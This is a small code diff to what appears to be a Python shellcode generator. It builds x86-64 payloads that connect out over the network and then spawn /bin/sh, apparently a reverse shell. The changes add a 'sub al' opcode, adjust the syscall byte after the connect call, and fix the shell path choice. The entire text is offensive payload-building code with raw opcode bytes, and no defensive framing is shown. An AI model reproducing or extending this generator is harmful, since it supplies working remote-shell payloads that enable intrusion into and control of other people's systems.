@@ -74,7 +74,8 @@ SUB = {
     "rcx,rcx": r"\x48\x29\xc9",
     "rdx,rdx": r"\x48\x29\xd2",
     "rsi,rsi": r"\x48\x29\xf6",
-    "rdi,rdi": r"\x48\x29\xff"
+    "rdi,rdi": r"\x48\x29\xff",
+    "al": r"\x2c"
 }
 
 SHR = {
@@ -194,6 +195,7 @@ class Shellcode:
         self.__code += MOV["r10,rax"]
         self.clean("rax")
         self.__code += MOV["al"] + SYS_CONNECT
+        self.__code += SUB["al"] + r"\x01"
         self.clean("rbx")
         self.__code += PUSH["rbx"]
 
@@ -239,7 +241,8 @@ class Shellcode:
 
         # Gen random between '//bin/sh' and '/bin//sh'
         rd_index = randrange(2)
-        self.__code += MOV["rbx"] + SHELL[rd_index]
+        #self.__code += MOV["rbx"] + SHELL[rd_index]
+        self.__code += MOV["rbx"] + SHELL[0]
 
         # Filename
         self.__code += PUSH["rax"]
